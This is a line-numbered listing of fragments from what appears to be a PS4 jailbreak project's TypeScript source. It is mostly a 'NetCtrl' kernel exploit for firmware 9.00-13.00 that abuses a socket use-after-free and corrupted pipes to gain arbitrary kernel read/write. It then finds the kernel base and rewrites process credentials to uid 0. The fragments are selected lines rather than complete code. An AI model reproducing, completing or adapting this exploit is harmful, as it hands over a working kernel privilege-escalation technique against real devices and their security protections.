+1968:    kernel.addr.base = kernel.addr.inside_kdata.sub(kernel_offset.EVF_OFFSET)
+1969:    log('Kernel base: ' + hex(kernel.addr.base))
+1976:    const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD!))!
+1977:    const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED))!
+1979:    kernel.write_dword(ucred.add(0x04), 0)  // cr_uid
+1980:    kernel.write_dword(ucred.add(0x08), 0)  // cr_ruid
+1981:    kernel.write_dword(ucred.add(0x0C), 0)  // cr_svuid
+1982:    kernel.write_dword(ucred.add(0x10), 1)  // cr_ngroups
+1983:    kernel.write_dword(ucred.add(0x14), 0)  // cr_rgid
+1985:    const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0))!
+===== src_download0_netctrl_c0w_twins.ts =====
+734678dfd5874d35d5af2329598b3af350ae7309ac8d128e995f16cf41234d08  vue-tag20/src_download0_netctrl_c0w_twins.ts
+ 2325 68206 vue-tag20/src_download0_netctrl_c0w_twins.ts
+3:import { get_fwversion, hex, malloc, read16, read32, read64, send_notification, write16, write32, write64, write8, get_kernel_offset, kernel, jailbreak_shared, read8 } from 'download0/kernel'
+11:include('kernel.js')
+95:const KERNEL_PID = 0
+159:let FW_VERSION: string | null = null // Needs to be initialized to patch kernel
+628:  log('=== PS4 NetCtrl Jailbreak ===')
+651:  if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.00') > 0) {
+652:    log('Unsupported PS4 firmware\nSupported: 9.00-13.00\nAborting...')
+657:  kernel_offset = get_kernel_offset(FW_VERSION)
+658:  log('Kernel offsets loaded for FW ' + FW_VERSION)
+668:  debug('Preparing netctrl...')
+715:  // Create pipes for arbitrary kernel r/w
+837:        log('netctrl failed!')
+996:function netctrl_exploit () {
+1018:    log('Failed to acquire kernel R/W')
+1057:  const fd_files = kreadslow64(kq_fdp)
+1061:  master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE))
+1064:  victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE))
+1067:  master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00))
+1070:  victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00))
+1080:  var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)
+1084:    throw new Error('Netctrl failed - Shutdown and try again')
+1087:  // Test if kwriteslow worked as expected or try again
+1090:    if (kread64(master_r_pipe_data.add(0x10)).eq(victim_r_pipe_data)) {
+1094:    debug('kwriteslow did not work - Trying again')
+1095:    ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)
+1098:      throw new Error('Netctrl failed - Shutdown and try again')
+1103:    throw new Error('Netctrl failed - Shutdown and try again')
+1121:    const readed = kread64(master_r_pipe_data.add(i))
+1127:  debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)))
+1151:  const f_data = kread64(fp.add(0x00))
+1155:  const pipe_sigio = kread64(f_data.add(0xd0))
+1159:  let p = kread64(pipe_sigio)
+1161:  kernel.addr.curproc = p // Set global curproc
+1166:    p = kread64(p.add(0x08)) // p_list.le_prev
+1181:  if (!kernel_offset) {
+1182:    throw new Error('Kernel offsets not loaded')
+1192:  kernel.addr.allproc = find_allproc() // Set global allproc
+1193:  debug('allproc: ' + hex(kernel.addr.allproc))
+1195:  // Calculate kernel base
+1196:  kernel.addr.base = kl_lock.sub((kernel_offset as { KL_LOCK: number }).KL_LOCK)
+1197:  log('Kernel base: ' + hex(kernel.addr.base))
+1202:  utils.notify('The Vue-after-Free team congratulates you\nNetCtrl Finished OK\nEnjoy freedom')
+1210:  kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1) // f_count
+1214:  var f = kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE))
+1220:  // In case last triplet was not found in kwriteslow
+1225:      const f_data = kread64(fp.add(0x00))
+1226:      const so_pcb = kread64(f_data.add(0x18))
+1227:      const in6p_outputopts = kread64(so_pcb.add(0x118))
+1228:      kwrite64(in6p_outputopts.add(0x68), new BigInt(0)) // ip6po_rhi_rthdr
+1260:function kwrite (dest: BigInt, src: BigInt, n: number) {
+1265:function kread (dest: BigInt, src: BigInt, n: number) {
+1266:  debug('Enter kread for src: ' + hex(src))
+1272:  // debug("kread_read: " + hex(readed) );
+1276:function kwrite64 (addr: BigInt, val: BigInt) {
+1278:  kwrite(addr, tmp, 8)
+1281:function kwrite32 (addr: BigInt, val: number) {
+1283:  kwrite(addr, tmp, 4)
+1286:function kread64 (addr: BigInt) {
+1287:  kread(tmp, addr, 8)
+1291:function kread32 (addr: BigInt) {
+1292:  kread(tmp, addr, 4)
+1310:// Functions used in global kernel.js
+1312:kernel.read_buffer = function (kaddr, len) {
+1313:  kread(tmp, kaddr, len)
+1317:kernel.write_buffer = function (kaddr, buf) {
+1319:  kwrite(kaddr, tmp, buf.length)
+1327:  kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0))
+1332:      kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0))
+1397:        throw new Error('Netctrl failed - Shutdown and try again')
+1522:  // kq_fdp = read64(leak_rthdr.add(0xA8)); // PS5 offset
+1547:function kreadslow64 (address: BigInt) {
+1548:  const buffer = kreadslow(address, 8)
+1549:  // debug("Buffer from kreadslow: " + hex(buffer));
+1552:    throw new Error('Netctrl failed - Shutdown and try again')
+1560:  write64(uio.add(0x10), BigInt_Error)   // uio_offset
+1569:function kreadslow (addr: BigInt, size: number) {
+1571:  debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size)
+1575:    log('kreadslow - Memory exhausted before start')
+1580:  debug('kreadslow - Preparing buffers...')
+1598:  debug('kreadslow - Freeing triplets[1]=' + triplets[1])
+1606:  debug('kreadslow - Starting uio reclaim loop...')
+1615:        log('netctrl failed!')
+1624:      debug('kreadslow - uio loop iter ' + count)
+1650:    debug('kreadslow - Failed uio reclaim after 10000 iterations')
+1654:  debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations')
+1657:  debug('kreadslow - uio_iov: ' + hex(uio_iov))
+1662:  debug('kreadslow - Freeing triplets[2]=' + triplets[2])
+1670:  debug('kreadslow - Starting iov reclaim loop...')
+1680:        log('netctrl failed!')
+1695:      debug('kreadslow - iov reclaim succeeded after ' + count2 + ' iterations')
+1705:  debug('kreadslow - Reading leak buffers...')
+1718:    debug('kreadslow - leak_buffers[' + i + ']: ' + hex(val))
+1720:      debug('kreadslow - Found valid leak at index ' + i + ', finding triplets[1]...')
+1723:      debug('kreadslow - triplets[1]=' + triplets[1])
+1735:    debug('kreadslow - No valid leak found')
+1741:  debug('kreadslow - Finding triplets[2]...')
+1747:    debug('kreadslow - triplets[2] retry ' + (retry + 1))
+1750:  debug('kreadslow - triplets[2]=' + triplets[2])
+1753:    debug('kreadslow - Failed to find triplets[2]')
+1774:  debug('kreadslow - Done, returning leak_buffer: ' + hex(leak_buffer))
+1779:function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
+1781:  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size)
+1802:        log('netctrl failed!')
+1846:        log('netctrl failed!')
+1893:    debug('kwriteslow - Failed to find triplets[2]')
+2276:    rop.push(spray_rthdr_rop.add(i * UCRED_SIZE)) // Offset for socket i
+2297:    rop.push(read_rthdr_rop.add(i * 8))  // Offset for socket i
+2324:netctrl_exploit()
